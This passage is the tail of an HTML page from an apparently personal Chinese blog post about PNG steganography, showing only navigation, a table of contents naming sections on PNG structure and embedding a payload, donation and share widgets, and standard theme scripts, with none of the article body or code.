        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">CTF-图像学基础</h4>
      </a>
    </div>
  

  
    <div class="waves-block waves-effect next">
      <a href="/2017/10/28/CTF-密码学/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">CTF-密码学</h4>
      </a>
    </div>
  
</nav>


</article>

    <div id="reward" class="page-modal reward-lay">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <h3 class="reward-title">
        <i class="icon icon-quote-left"></i>
        我们一起来让这个世界有趣一点
        <i class="icon icon-quote-right"></i>
    </h3>
    <div class="reward-content">
        
        <div class="reward-code">
            <img id="rewardCode" src="/img/wc.png" alt="打赏二维码">
        </div>
        
        <label class="reward-toggle">
            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
                data-wechat="/img/wc.png" data-alipay="/img/123.png">
            <div class="reward-toggle-ctrol">
                <span class="reward-toggle-item wechat">微信</span>
                <span class="reward-toggle-label"></span>
                <span class="reward-toggle-item alipay">支付宝</span>
            </div>
        </label>
        
    </div>
</div>

    

</div>

    <aside class="post-widget">
        <nav class="post-toc-wrap" id="post-toc">
            <h4>TOC</h4>
            <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#00x0-前言"><span class="post-toc-number">1.</span> <span class="post-toc-text"> 00X0-前言</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x01-png文件格式"><span class="post-toc-number">2.</span> <span class="post-toc-text"> 0X01-PNG文件格式</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x02-实例图片分析"><span class="post-toc-number">3.</span> <span class="post-toc-text"> 0x02-实例图片分析</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x03-编写程序分析文件格式"><span class="post-toc-number">4.</span> <span class="post-toc-text"> 0x03-编写程序分析文件格式</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x04-去除多余数据"><span class="post-toc-number">5.</span> <span class="post-toc-text"> 0x04-去除多余数据</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x05-写入payload"><span class="post-toc-number">6.</span> <span class="post-toc-text"> 0x05-写入Payload</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x06-读取payload并执行"><span class="post-toc-number">7.</span> <span class="post-toc-text"> 0x06-读取payload并执行</span></a></li></ol>
        </nav>
    </aside>
    
        <footer class="footer">
    
    <div class="top">
        
        
            <p>
    <span>Links：</span>
    
    <span class="blogroll-item">
        <a href="https://www.github.com/Peterpan0927" target="_blank">github</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://bbs.iosre.com" target="_blank">iOSRE</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://www.coding.net" target="_blank">coding</a>
    </span>
    
</p>

        
    </div>
    
    <div class="bottom">
        <p>
            <span>
                Peter pan &copy; 2017
            </span>
        		
           	
            
            
            <span>
	            Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/codefine/hexo-theme-mellow" target="_blank">mellow</a>
            </span>
            
            
            
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://yoursite.com/2017/10/29/PNG在隐写中的应用/&title=《PNG在隐写中的应用》 — Peterpan's Blog&pic=http://yoursite.com/img/miao_icon.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://yoursite.com/2017/10/29/PNG在隐写中的应用/&title=《PNG在隐写中的应用》 — Peterpan's Blog&source=让我们一起来了解一下png图片的构成吧～知其然亦知其所以然" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACJ0lEQVR42u3aQW7DMAwEwPz/0ynQU4HG7pKS0YQenYzAkjU5EBSpxyMez++RPP8cv1c4f/9o7raBgYHxsYxkueoHEsz5t8pUDAyMGzB6QTZ//3y7yTp/7BkDAwMjDqB50Dz6OgYGBsY6o7B0AF4P7hgYGPdhVA+WyQpJoW1bSQ4DA2M0Y29jYO/zv/U3MDAw3obxvGD0mg353BezMDAwRjN2XZhIUsbqgTZJLptnbgwMjA9nJNcmqkX/Xum//EdjYGAMZayUsaqtgt5z8kdgYGDck1FY4jSw5plbdR0MDIz7MPKP5elgNYyef7E3FwMDYyqjmqKtb73KiAI3BgbGUEZe/Go2F+O0MmkGlEMtBgbGIEZ1Q3lzcaVJWQjHGBgYQxlJA3IlOF7RBnjxjIGBMZrRfDUIpknxLt/0hjwXAwPjYxm7lis0F+OLGoWiGwYGxm0YvfZkrzC3ftXsMOBiYGAMZeSXrnrH114RrZnVYmBgDGWsXHc4f2e9kFfubGBgYIxjXHiwXLicUW0PYGBgzGbkid3eZmdenovmYmBgjGbk03oFsl7q2WuXYmBgTGX0UrdeAneOWbp8hoGBMZqRj/zIur6hHh4DA2M2o1oCW/l9b8DFwMC4GyM50CaH0mrgrgb9w51gYGBgtFoIeWDttQ2WAi4GBsZQRrLpavq4AYCBgXEbRm9zeSOzuvVyOMbAwBjNWGkMJBcp8ssW+R+xub+BgYHxvowvNK3CeElrl6YAAAAASUVORK5CYII=" alt="微信分享二维码">
</div>


    
    <!-- main-js -->
<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.0.7"></script>

<script type="text/javascript" src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>

<script type="text/javascript" src="/js/method.js?v=1.0.7"></script>
<script type="text/javascript" src="/js/blog.js?v=1.0.7"></script>

<!-- third-party -->



<script type="text/javascript" src="/js/plugins/local_search.js?v=1.0.7"></script>
<script type="text/javascript">
	var search_path = "search.xml";
	if (search_path.length === 0) {
		search_path = "search.xml";
	}
	var path = "/" + search_path;
	searchFunc(path, "local-search-input", "local-search-result");
</script>



    
        <script type="text/javascript" src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<script type="text/javascript" src="//unpkg.com/valine/dist/Valine.min.js"></script>
<script type="text/javascript" src="/js/plugins/valine.js?v=1.0.7"></script>
    



<script type="text/javascript" src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
<script type="text/javascript" src="/js/plugins/leancloud_visitors.js?v=1.0.7"></script>



    <!-- mathjax config similar to math.stackexchange -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
            processEscapes: true,
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
        }
    });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for (i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>




    <script>
    (function() {
        var OriginTitile = document.title, titleTime;
        document.addEventListener('visibilitychange', function() {
            if (document.hidden) {
                document.title = '思维失去连接...';
                clearTimeout(titleTime);
            } else {
                document.title = '(つェ⊂)咦!又好了!';
                titleTime = setTimeout(function() {
                    document.title = OriginTitile;
                },2000);
            }
        });
    })();
</script>


    
</body>
</html>
